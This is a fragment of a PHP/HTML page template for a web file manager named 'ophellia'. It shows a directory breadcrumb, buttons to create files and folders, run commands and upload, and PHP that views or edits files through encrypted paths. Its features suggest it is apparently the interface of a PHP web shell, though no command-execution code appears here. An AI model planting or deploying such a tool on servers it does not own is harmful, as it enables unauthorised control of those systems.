                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1">
                            </path>
                        </svg>
                        Logout
                    </a>
                </div>
            </div>
        </div>
    </header>

    <div class="flex-grow">
        <div class="container mx-auto px-3 sm:px-4 py-4 sm:py-6">
            <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant p-4 sm:p-5 mb-4 sm:mb-6">
                <div class="mb-4">
                    <h2
                        class="text-sm font-semibold text-on-surface-variant uppercase tracking-wider mb-2 flex items-center">
                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path>
                        </svg>
                        Current Directory
                    </h2>
                    <div class="overflow-x-auto pb-1 -mx-1 px-1">
                        <div
                            class="path-navigator text-sm py-2 px-3 bg-surface-container rounded-xl border border-outline-variant min-w-max">
                            <?= breadcrumbPath($currentDir) ?>
                        </div>
                    </div>
                </div>

                <div class="flex flex-wrap gap-2">
                    <button onclick="showNewFileModal('<?= encryptPath($currentDir) ?>')"
                        class="flex items-center px-3 py-2 bg-primary text-on-primary rounded-xl hover:opacity-90 transition-all shadow-sm hover:shadow-md text-sm font-medium">
                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                        <span class="hidden sm:inline">New File</span>
                        <span class="sm:hidden">File</span>
                    </button>
                    <button onclick="showNewFolderModal('<?= encryptPath($currentDir) ?>')"
                        class="flex items-center px-3 py-2 bg-primary text-on-primary rounded-xl hover:opacity-90 transition-all shadow-sm hover:shadow-md text-sm font-medium">
                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M9 13h6m-3-3v6m-9-6h.01M19 13h.01M19 19h.01M5 19h.01M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z">
                            </path>
                        </svg>
                        <span class="hidden sm:inline">New Folder</span>
                        <span class="sm:hidden">Folder</span>
                    </button>
                    <button onclick="showCommandModal('<?= encryptPath($currentDir) ?>')"
                        class="flex items-center px-3 py-2 bg-primary text-on-primary rounded-xl hover:opacity-90 transition-all shadow-sm hover:shadow-md text-sm font-medium">
                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z">
                            </path>
                        </svg>
                        <span class="hidden sm:inline">Command</span>
                        <span class="sm:hidden">Cmd</span>
                    </button>
                    <button onclick="showUploadModal('<?= encryptPath($currentDir) ?>')"
                        class="flex items-center px-3 py-2 bg-primary text-on-primary rounded-xl hover:opacity-90 transition-all shadow-sm hover:shadow-md text-sm font-medium">
                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12">
                            </path>
                        </svg>
                        <span class="hidden sm:inline">Upload</span>
                        <span class="sm:hidden">Up</span>
                    </button>
                    <button onclick="showInfoModal()"
                        class="flex items-center px-3 py-2 bg-primary text-on-primary rounded-xl hover:opacity-90 transition-all shadow-sm hover:shadow-md text-sm font-medium">
                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z">
                            </path>
                        </svg>
                        <span class="hidden sm:inline">Information</span>
                        <span class="sm:hidden">Info</span>
                    </button>
                </div>
            </div>

            <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant p-4 sm:p-6">
                <?php
                if (isset($_GET['action'])) {
                    switch ($_GET['action']) {
                        case 'view':
                            if (isset($_GET['file'])) {
                                viewFile(decryptPath($_GET['file']));
                            }
                            break;
                        case 'edit':
                            if (isset($_GET['file'])) {
                                editFile(decryptPath($_GET['file']));
                            }
                            break;
                        default:
                            fileManager($currentDir);
                    }
                } else {
                    fileManager($currentDir);
                }
                ?>
            </div>
        </div>
    </div>

    <footer class="bg-surface-container-highest text-on-surface-variant py-5 mt-auto">
        <div class="container mx-auto px-4">
            <div class="flex flex-col sm:flex-row justify-between items-center gap-3">
                <div class="flex items-center gap-2">
                    <span class="text-sm">
                        <a href="https://rei.my.id" class="hover:text-primary transition-colors">@elliottophellia</a>
                    </span>
                </div>
                <div class="flex items-center gap-4 text-sm">
                    <a href="https://t.me/elliottophellia"
                        class="hover:text-primary transition-colors flex items-center gap-1">
                        <svg class="h-4 w-4" fill="currentColor" viewBox="0 0 24 24">
                            <path
                                d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161c-.18 1.897-.962 6.502-1.359 8.627-.168.9-.5 1.201-.82 1.23-.697.064-1.226-.461-1.901-.903-1.056-.692-1.653-1.123-2.678-1.799-1.185-.781-.417-1.21.258-1.911.177-.184 3.247-2.977 3.307-3.23.007-.032.015-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.139-5.062 3.345-.479.329-.913.489-1.302.481-.428-.009-1.252-.242-1.865-.442-.751-.244-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.831-2.529 6.998-3.015 3.333-1.386 4.025-1.627 4.477-1.635.099-.002.321.023.465.141.121.1.154.235.17.331.015.093.034.305.019.471z" />
                        </svg>
                        Contact
                    </a>
                    <a href="https://github.com/elliottophellia/ophellia"
                        class="hover:text-primary transition-colors flex items-center gap-1">
                        <svg class="h-4 w-4" fill="currentColor" viewBox="0 0 24 24">
                            <path
                                d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" />
                        </svg>
                        GitHub
                    </a>
                </div>
            </div>
        </div>
    </footer>

    <script src="ophellia.js"></script>
    <?php if (!empty($alertMessages)): ?>
        <script>
            document.addEventListener('DOMContentLoaded', function () {
                <?php
                foreach ($alertMessages as $alert) {
                    echo "showAlert(" . json_encode($alert['message']) . ", " . json_encode($alert['type']) . ");\n";
                }
                ?>
            });
        </script>
    <?php endif; ?>
</body>

</html>